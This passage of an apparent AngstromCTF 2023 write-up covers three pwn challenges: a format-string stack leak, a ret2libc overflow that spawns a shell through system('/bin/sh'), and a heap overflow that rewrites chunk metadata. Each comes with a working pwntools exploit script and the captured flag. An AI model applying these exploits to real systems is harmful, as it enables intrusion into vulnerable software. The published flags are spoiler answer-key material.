Connecting to the challenge we are asked: `What did you learn in class today?` so we can send a string. We can submit a format string like `%p` to see that it returns `Oh nice, 0x7ffe79e8d120`. We can also access directly some parameters in this way:

`%<number_of_parameter>$<format>` for exemple: `%14$llx,%15$llx,%16$llx`; it returns:

`Oh nice, 3474737b66746361,75715f74695f6b63,615f74695f657565`.
We can see with some tries that the flag is here in the stack. So we can script the solution.

```python
from Crypto.Util.number import *
from pwn import *

flag = ""
host =  "challs.actf.co"
port = 31322
for i in range (14, 19, 1):
    r = remote(host, port)
    r.recvuntil(b'? ')
    payload = f'%{i}$llx,%{i+1}$llx'
    r.sendline(bytes(payload, 'utf-8'))
    r.recvuntil(b'Oh nice, ')
    stringa = r.recvline()
    stringa = stringa.decode('utf-8')
    stringhe = stringa.split(',')
    temp = ''
    for s in stringhe:
        if len(s)%2 != 0:
            s = '0' + s
        temp += s
    temp = temp.strip()
    temp = temp[:-1]
    flag = flag + str((bytes.fromhex(temp)[::-1])[-8:])
    r.close()
flag = flag.replace('\'b\'', '')
print(flag)
```

If the input string is too long it overwrite the flag in the stack, so we have to take it piece by piece. The code above take 8 chars of the flag at every iteration and put them in the variable flag. At the end we only clean the output.

🏁 _actf{st4ck_it_queue_it_a619ad974c864b22}_{: .spoiler}

## gaga

> _Multipart challenge! Note all use essentially the same Dockerfile. The flags are split among all three challenges. If you are already a pwn expert, the last challenge has the entire flag._<br>
> _nc challs.actf.co xxxxx, xxxx, xxxx_<br>
> _Attachments: gaga0, gaga1, gaga2, Dockerfile_

```c:source.c
void main(void)

{
  char local_48 [60];
  __gid_t local_c;

  setbuf(stdout,(char *)0x0);
  local_c = getegid();
  setresgid(local_c,local_c,local_c);
  puts("Awesome! Now there\'s no system(), so what will you do?!");
  printf("Your input: ");
  gets(local_48);
  return;
}
```

Nothing much to say about this challenge, it's a classic ret2libc attack. We leak the libc through puts, we find the correct version of libc on [libc database](https://libc.rip/) and then we call `system("/bin/sh")`.

```python:exploit.py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./gaga2_patched")
libc = ELF("./libc.so.6")
context.binary = exe
context.terminal = ['terminator', '-x']

# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript='''b *main+116''')
    else:
        r = remote("challs.actf.co", 31302)

    return r


def main():
    r = conn()

    offset = 72
    pop_rdi = p64(0x00000000004012b3)
    ret = p64(0x000000000040101a)

    payload = b'a'*offset + pop_rdi + \
        p64(exe.got.printf) + p64(exe.sym.puts) + p64(exe.sym.main)
    r.sendlineafter(b': ', payload)

    leak = u64(r.recvline().strip().ljust(8, b'\x00'))

    libc.address = leak - libc.sym.printf
    print(hex(libc.address))

    payload = b'a'*offset + ret + pop_rdi + \
        p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
    r.sendlineafter(b': ', payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

🏁 _actf{b4by's_f1rst_pwn!_3857ffd6bfdf775e}_{: .spoiler}

## leek

> _nc challs.actf.co xxxxx_<br>
> _Attachments: leek, Dockerfile_

Again, we analyze the binary file with Ghidra.

```c:source
void main(void)
{
  __gid_t __rgid;
  int iVar1;
  time_t seed;
  char *my_input;
  char *random_bytes;
  long in_FS_OFFSET;
  int i;
  int j;
  char second_input [40];
  long canary;

  canary = *(long *)(in_FS_OFFSET + 0x28);
  seed = time((time_t *)0x0);
  srand((uint)seed);
  setbuf(stdout,(char *)0x0);
  setbuf(stdin,(char *)0x0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  puts("I dare you to leek my secret.");
  i = 0;
  while( true ) {
    if (99 < i) {
      puts("Looks like you made it through.");
      win();
      if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
        __stack_chk_fail();
      }
      return;
    }
    my_input = (char *)malloc(0x10);
    random_bytes = (char *)malloc(0x20);
    memset(random_bytes,0,0x20);
    getrandom(random_bytes,0x20,0);
    for (j = 0; j < 32; j = j + 1) {
      if ((random_bytes[j] == '\0') || (random_bytes[j] == '\n')) {
        random_bytes[j] = '\x01';
      }
    }
    printf("Your input (NO STACK BUFFER OVERFLOWS!!): ");
    input(my_input);
    printf(":skull::skull::skull: bro really said: ");
    puts(my_input);
    printf("So? What\'s my secret? ");
    fgets(second_input,33,stdin);
    iVar1 = strncmp(random_bytes,second_input,0x20);
    if (iVar1 != 0) break;
    puts("Okay, I\'ll give you a reward for guessing it.");
    printf("Say what you want: ");
    gets(my_input);
    puts("Hmm... I changed my mind.");
    free(random_bytes);
    free(my_input);
    puts("Next round!");
    i = i + 1;
  }
  puts("Wrong!");
  exit(-1);
}
```

First thing we notice is the presence of a win function, which is called if we manage to pass 100 cycles of the while loop. The program asks us to guess a random generated number to pass each round, that is clearly impossible. The challenge gives us a little suggestion on how to exploit it by printing `(NO STACK BUFFER OVERFLOWS!!)`. \\
The solution is indeed to perform a heap overflow, since our input and the random bytes to be guesssed are both allocated in the heap. We can overflow because of the `fgets(buf,0x500,stdin);` inside the input function, therefore we can overwrite the random bytes with whatever we want and then guess. \\
The last problem to solve is to don't make the program crash on the free instructions. This happens because when we overflow the heap we also overwrite its metadata, leading to the `free` failure.

![leek](/assets/img/AngstromCTF_2023/leek.png)

As we can see in the picture above the metadata of the random bytes memory chunk are overwritten. Luckily we can fix up the metadata with another overflow (`gets(my_input);`) after the guess.

```python:solve.py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./leek")

context.binary = exe
context.terminal = ['terminator', '-x']


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript='''
                      b *main+512
                      c
                      ''')
    else:
        r = remote("challs.actf.co", 31310)

    return r


def main():
    r = conn()
    l = log.progress('i')
    for i in range(100):
        l.status(str(i))
        r.sendlineafter(b': ', b'a'*64)
        r.sendafter(b'secret? ', b'a'*32)

        payload = b'\x01'*24 + p64(0x31)+b'\x01'*32
        r.sendlineafter(b': ', payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

🏁 _actf{very_133k_of_y0u_777522a2c32b7dd6}_{: .spoiler}
